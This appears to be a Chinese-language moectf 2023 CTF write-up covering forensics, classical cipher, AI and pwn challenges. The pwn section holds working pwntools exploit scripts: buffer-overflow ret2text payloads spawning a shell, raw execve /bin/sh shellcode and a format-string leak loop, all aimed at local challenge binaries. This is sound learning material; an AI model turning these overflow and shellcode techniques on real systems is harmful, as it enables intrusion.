<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt; r = redis.<span class="hljs-title function_ invoke__">Redis</span>(host=<span class="hljs-string">&#x27;172.20.0.2&#x27;</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>)<br>r = redis.<span class="hljs-title function_ invoke__">Redis</span>(host=<span class="hljs-string">&#x27;172.20.0.2&#x27;</span>, port=<span class="hljs-number">6379</span>, db=<span class="hljs-number">0</span>)<br>&gt;&gt;&gt; r.<span class="hljs-title function_ invoke__">info</span>()<br>r.<span class="hljs-title function_ invoke__">info</span>()<br>&#123;<span class="hljs-string">&#x27;redis_version&#x27;</span>: <span class="hljs-string">&#x27;6.2.14&#x27;</span>, <span class="hljs-string">&#x27;redis_git_sha1&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;redis_git_dirty&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;redis_build_id&#x27;</span>: <span class="hljs-string">&#x27;32759a165f0d308e&#x27;</span>, <span class="hljs-string">&#x27;redis_mode&#x27;</span>: <span class="hljs-string">&#x27;standalone&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>: <span class="hljs-string">&#x27;Linux 5.15.0-71-generic x86_64&#x27;</span>, <span class="hljs-string">&#x27;arch_bits&#x27;</span>: <span class="hljs-number">64</span>, <span class="hljs-string">&#x27;monotonic_clock&#x27;</span>: <span class="hljs-string">&#x27;POSIX clock_gettime&#x27;</span>, <span class="hljs-string">&#x27;multiplexing_api&#x27;</span>: <span class="hljs-string">&#x27;epoll&#x27;</span>, <span class="hljs-string">&#x27;atomicvar_api&#x27;</span>: <span class="hljs-string">&#x27;c11-builtin&#x27;</span>, <span class="hljs-string">&#x27;gcc_version&#x27;</span>: <span class="hljs-string">&#x27;12.2.0&#x27;</span>, <span class="hljs-string">&#x27;process_id&#x27;</span>: <span class="hljs-number">19</span>, <span class="hljs-string">&#x27;process_supervised&#x27;</span>: <span class="hljs-string">&#x27;no&#x27;</span>, <span class="hljs-string">&#x27;run_id&#x27;</span>: <span class="hljs-string">&#x27;5ed13119850428cace41651d5a84dddee600dbe8&#x27;</span>, <span class="hljs-string">&#x27;tcp_port&#x27;</span>: <span class="hljs-number">6379</span>, <span class="hljs-string">&#x27;server_time_usec&#x27;</span>: <span class="hljs-number">1697725339377424</span>, <span class="hljs-string">&#x27;uptime_in_seconds&#x27;</span>: <span class="hljs-number">14190</span>, <span class="hljs-string">&#x27;uptime_in_days&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;hz&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;configured_hz&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;lru_clock&#x27;</span>: <span class="hljs-number">3226523</span>, <span class="hljs-string">&#x27;executable&#x27;</span>: <span class="hljs-string">&#x27;/data/redis-server&#x27;</span>, <span class="hljs-string">&#x27;config_file&#x27;</span>: <span class="hljs-string">&#x27;/etc/redis/redis.conf&#x27;</span>, <span class="hljs-string">&#x27;io_threads_active&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;connected_clients&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;cluster_connections&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxclients&#x27;</span>: <span class="hljs-number">10000</span>, <span class="hljs-string">&#x27;client_recent_max_input_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;client_recent_max_output_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;blocked_clients&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_clients&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;clients_in_timeout_table&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_memory&#x27;</span>: <span class="hljs-number">875704</span>, <span class="hljs-string">&#x27;used_memory_human&#x27;</span>: <span class="hljs-string">&#x27;855.18K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_rss&#x27;</span>: <span class="hljs-number">3837952</span>, <span class="hljs-string">&#x27;used_memory_rss_human&#x27;</span>: <span class="hljs-string">&#x27;3.66M&#x27;</span>, <span class="hljs-string">&#x27;used_memory_peak&#x27;</span>: <span class="hljs-number">875704</span>, <span class="hljs-string">&#x27;used_memory_peak_human&#x27;</span>: <span class="hljs-string">&#x27;855.18K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_peak_perc&#x27;</span>: <span class="hljs-string">&#x27;100.19%&#x27;</span>, <span class="hljs-string">&#x27;used_memory_overhead&#x27;</span>: <span class="hljs-number">811944</span>, <span class="hljs-string">&#x27;used_memory_startup&#x27;</span>: <span class="hljs-number">811944</span>, <span class="hljs-string">&#x27;used_memory_dataset&#x27;</span>: <span class="hljs-number">63760</span>, <span class="hljs-string">&#x27;used_memory_dataset_perc&#x27;</span>: <span class="hljs-string">&#x27;100.00%&#x27;</span>, <span class="hljs-string">&#x27;allocator_allocated&#x27;</span>: <span class="hljs-number">845608</span>, <span class="hljs-string">&#x27;allocator_active&#x27;</span>: <span class="hljs-number">1105920</span>, <span class="hljs-string">&#x27;allocator_resident&#x27;</span>: <span class="hljs-number">3469312</span>, <span class="hljs-string">&#x27;total_system_memory&#x27;</span>: <span class="hljs-number">1743826944</span>, <span class="hljs-string">&#x27;total_system_memory_human&#x27;</span>: <span class="hljs-string">&#x27;1.62G&#x27;</span>, <span class="hljs-string">&#x27;used_memory_lua&#x27;</span>: <span class="hljs-number">30720</span>, <span class="hljs-string">&#x27;used_memory_lua_human&#x27;</span>: <span class="hljs-string">&#x27;30.00K&#x27;</span>, <span class="hljs-string">&#x27;used_memory_scripts&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_memory_scripts_human&#x27;</span>: <span class="hljs-string">&#x27;0B&#x27;</span>, <span class="hljs-string">&#x27;number_of_cached_scripts&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxmemory&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;maxmemory_human&#x27;</span>: <span class="hljs-string">&#x27;0B&#x27;</span>, <span class="hljs-string">&#x27;maxmemory_policy&#x27;</span>: <span class="hljs-string">&#x27;noeviction&#x27;</span>, <span class="hljs-string">&#x27;allocator_frag_ratio&#x27;</span>: <span class="hljs-number">1.31</span>, <span class="hljs-string">&#x27;allocator_frag_bytes&#x27;</span>: <span class="hljs-number">260312</span>, <span class="hljs-string">&#x27;allocator_rss_ratio&#x27;</span>: <span class="hljs-number">3.14</span>, <span class="hljs-string">&#x27;allocator_rss_bytes&#x27;</span>: <span class="hljs-number">2363392</span>, <span class="hljs-string">&#x27;rss_overhead_ratio&#x27;</span>: <span class="hljs-number">1.11</span>, <span class="hljs-string">&#x27;rss_overhead_bytes&#x27;</span>: <span class="hljs-number">368640</span>, <span class="hljs-string">&#x27;mem_fragmentation_ratio&#x27;</span>: <span class="hljs-number">4.73</span>, <span class="hljs-string">&#x27;mem_fragmentation_bytes&#x27;</span>: <span class="hljs-number">3026008</span>, <span class="hljs-string">&#x27;mem_not_counted_for_evict&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_replication_backlog&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_clients_slaves&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_clients_normal&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_aof_buffer&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;mem_allocator&#x27;</span>: <span class="hljs-string">&#x27;jemalloc-5.1.0&#x27;</span>, <span class="hljs-string">&#x27;active_defrag_running&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;lazyfree_pending_objects&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;lazyfreed_objects&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;loading&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_cow_size_age&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_fork_perc&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;current_save_keys_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;current_save_keys_total&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_changes_since_last_save&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_bgsave_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;rdb_last_save_time&#x27;</span>: <span class="hljs-number">1697711149</span>, <span class="hljs-string">&#x27;rdb_last_bgsave_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;rdb_last_bgsave_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rdb_current_bgsave_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rdb_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_enabled&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_rewrite_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_rewrite_scheduled&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aof_last_rewrite_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aof_current_rewrite_time_sec&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aof_last_bgrewrite_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;aof_last_write_status&#x27;</span>: <span class="hljs-string">&#x27;ok&#x27;</span>, <span class="hljs-string">&#x27;aof_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;module_fork_in_progress&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;module_fork_last_cow_size&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_connections_received&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;total_commands_processed&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;instantaneous_ops_per_sec&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_net_input_bytes&#x27;</span>: <span class="hljs-number">124</span>, <span class="hljs-string">&#x27;total_net_output_bytes&#x27;</span>: <span class="hljs-number">172</span>, <span class="hljs-string">&#x27;instantaneous_input_kbps&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;instantaneous_output_kbps&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;rejected_connections&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_full&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_partial_ok&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;sync_partial_err&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expired_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expired_stale_perc&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;expired_time_cap_reached_count&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;expire_cycle_cpu_milliseconds&#x27;</span>: <span class="hljs-number">176</span>, <span class="hljs-string">&#x27;evicted_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;keyspace_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;keyspace_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;pubsub_channels&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;pubsub_patterns&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;latest_fork_usec&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_forks&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;migrate_cached_sockets&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;slave_expires_tracked_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_key_hits&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;active_defrag_key_misses&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_keys&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_items&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;tracking_total_prefixes&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;unexpected_error_replies&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_error_replies&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;dump_payload_sanitizations&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;total_reads_processed&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;total_writes_processed&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;io_threaded_reads_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;io_threaded_writes_processed&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;role&#x27;</span>: <span class="hljs-string">&#x27;master&#x27;</span>, <span class="hljs-string">&#x27;connected_slaves&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;master_failover_state&#x27;</span>: <span class="hljs-string">&#x27;no-failover&#x27;</span>, <span class="hljs-string">&#x27;master_replid&#x27;</span>: <span class="hljs-string">&#x27;72bf10998fb01f8851a13c92aaf4ccbbed81ab83&#x27;</span>, <span class="hljs-string">&#x27;master_replid2&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;master_repl_offset&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;second_repl_offset&#x27;</span>: -<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;repl_backlog_active&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;repl_backlog_size&#x27;</span>: <span class="hljs-number">1048576</span>, <span class="hljs-string">&#x27;repl_backlog_first_byte_offset&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;repl_backlog_histlen&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;used_cpu_sys&#x27;</span>: <span class="hljs-number">6.963199</span>, <span class="hljs-string">&#x27;used_cpu_user&#x27;</span>: <span class="hljs-number">8.13399</span>, <span class="hljs-string">&#x27;used_cpu_sys_children&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;used_cpu_user_children&#x27;</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">&#x27;used_cpu_sys_main_thread&#x27;</span>: <span class="hljs-number">6.965816</span>, <span class="hljs-string">&#x27;used_cpu_user_main_thread&#x27;</span>: <span class="hljs-number">8.12967</span>, <span class="hljs-string">&#x27;errorstat_ERR&#x27;</span>: <span class="hljs-string">&#x27;count=2&#x27;</span>, <span class="hljs-string">&#x27;cluster_enabled&#x27;</span>: <span class="hljs-number">0</span>&#125;<br><br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/116994677">https://blog.csdn.net/guo15890025019/article/details/116994677</a><br>未完待续……….（咕咕咕</p>
<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h3 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h3><p>vm挂载vmdk，windows10系统<br>打开后回收站里有key，用key打开锁上的磁盘即可</p>
<h3 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h3><p><img src="/mdimg/moectf2023/45.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/46.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="锁定起来的同人文"><a href="#锁定起来的同人文" class="headerlink" title="锁定起来的同人文"></a>锁定起来的同人文</h3><p><img src="/mdimg/moectf2023/47.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/moectf2023/48.png" srcset="/img/loading.gif" lazyload><br>挂载vc<br><code>&quot;L:\data\20230707221115-ibr7vs7\20230707221136-xyfn5al\20230707221147-1rzo2wp\20230707221158-6te2bxl.sy&quot;</code><br><img src="/mdimg/moectf2023/49.png" srcset="/img/loading.gif" lazyload><br>base32<code>moectf&#123;S0_d33ply_H1dden!&#125; </code></p>
<h1 id="classical-Crypto"><a href="#classical-Crypto" class="headerlink" title="classical Crypto"></a>classical Crypto</h1><h3 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h3><p>维吉尼亚，根据flag格式，用key <code>moectf&#123;</code>解维吉尼亚得到开头为<code>goodjo</code>猜测key为<code>goodjob</code>解密即可</p>
<h3 id="猫言喵语"><a href="#猫言喵语" class="headerlink" title="猫言喵语"></a>猫言喵语</h3><p><code>喵喵？</code>–》<code>-</code> <code>喵喵喵</code>–》<code>.</code><br><img src="/mdimg/moectf2023/50.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h3><p>rot47</p>
<h3 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h3><p><img src="/mdimg/moectf2023/51.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h3><p>凯撒7</p>
<h1 id="Ai"><a href="#Ai" class="headerlink" title="Ai"></a>Ai</h1><h3 id="EZ-MLP"><a href="#EZ-MLP" class="headerlink" title="EZ MLP"></a>EZ MLP</h3><p><img src="/mdimg/moectf2023/52.png" srcset="/img/loading.gif" lazyload><br>调换即可<br><code>moectf&#123;fR13NdsHlP_15_M491C!&#125;</code></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h3 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>str_binsh_addr = <span class="hljs-number">0x804C02C</span><br>sys_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">50227</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;What\&#x27;s your age?&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;200&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Now..try to overflow!&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x58</span> + <span class="hljs-number">0x4</span>) + p32(sys_plt) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + p32(str_binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pwn<br>X = pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">50677</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   tmp = X.recvline()<br>   <span class="hljs-built_in">print</span>(tmp.decode())<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;The first:&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      x=tmp.decode().index(<span class="hljs-string">&#x27;t&#x27;</span>)<br>      res1=tmp.decode()[x+<span class="hljs-number">2</span>:]<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;The second:&#x27;</span><span class="hljs-keyword">in</span> tmp:<br>      res2=tmp.decode()[<span class="hljs-number">11</span>:]<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;=&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      val=tmp.decode()[<span class="hljs-built_in">len</span>(res1)+<span class="hljs-built_in">len</span>(res2):]<br>      <span class="hljs-keyword">if</span>(<span class="hljs-built_in">int</span>(res1.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))+<span class="hljs-built_in">int</span>(res2)==<span class="hljs-built_in">int</span>(val)):<br>        data1=<span class="hljs-string">&quot;BlackBird&quot;</span>.encode()<br>        X.sendline(data1)<br>      <span class="hljs-keyword">else</span>:<br>        data2=<span class="hljs-string">&quot;WingS&quot;</span>.encode()<br>        X.sendline(data2)<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Congratulations!You finish&#x27;</span> <span class="hljs-keyword">in</span> tmp:<br>      X.interactive()<br>      tmp = X.recvline()<br>      <span class="hljs-built_in">print</span>(tmp.decode())<br></code></pre></td></tr></table></figure>

<h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>整形溢出<br><img src="/mdimg/moectf2023/a.png" srcset="/img/loading.gif" lazyload><br>int 的取值范围 <code>-2147483648～2147483647</code><br>-114514=<code>2147483647</code>+1+2147483648-114514<br>v1=4294852782</p>
<h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p><img src="/mdimg/moectf2023/b.png" srcset="/img/loading.gif" lazyload><br>fd2=4*1|0x29A=670</p>
<h3 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>re = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">00000</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)				<br>binsh = <span class="hljs-number">0x404050</span>				<br>system_plt = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]		<br>system_plt2 = <span class="hljs-number">0x4012B7</span><br>rdi_ret = <span class="hljs-number">0x4011be</span>				<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">88</span> + p64(rdi_ret) + p64(binsh) + p64(system_plt2)<br><br><span class="hljs-built_in">print</span>(re.recv(<span class="hljs-number">4096</span>).decode())<br>re.sendline(<span class="hljs-string">&#x27;120&#x27;</span>.encode())<br><br><span class="hljs-built_in">print</span>(re.recv(<span class="hljs-number">4096</span>).decode())<br>re.sendline(payload)<br>re.interactive()<br><br></code></pre></td></tr></table></figure>

<h3 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h3><p><img src="/mdimg/moectf2023/c.png" srcset="/img/loading.gif" lazyload><br>网上找到shellcode</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34897</span>)<br>shellcode=<span class="hljs-string">&#x27;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&#x27;</span><br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/mdimg/moectf2023/d.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs clean"># coding=utf<span class="hljs-number">-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42085</span>)<br>#p = process(<span class="hljs-string">&#x27;./uninitialized_key&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;114514&quot;</span>)<br>gdb.attach(p)<br>p.sendline(<span class="hljs-string">&quot;\x00&quot;</span>)#或者就直接留空。p.sendline(<span class="hljs-string">&quot;&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>,<span class="hljs-number">17</span>):<br>    p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">32809</span>)<br>    <span class="hljs-comment"># p = process(&#x27;./format_level0&#x27;)</span><br><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    p.sendline(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;i&#125;</span>$p&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br><br>    byte_str = binascii.unhexlify(p.recvline()[:-<span class="hljs-number">1</span>])<br>    str_result = byte_str.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    flag+=str_result[::-<span class="hljs-number">1</span>]<br><br>    p.close()<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>
